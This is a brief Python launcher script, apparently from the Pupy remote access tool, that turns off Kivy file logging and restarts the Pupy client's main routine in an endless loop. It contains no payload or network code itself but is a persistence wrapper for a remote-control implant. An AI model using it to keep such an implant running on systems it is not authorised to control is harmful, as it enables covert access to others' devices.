#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import os
os.environ['KIVY_NO_FILELOG']='yes'

from time import sleep
import pp

if __name__ == '__main__':
	while True:
		print "starting pupy ..."
		pp.main()
		print "pupy exit"
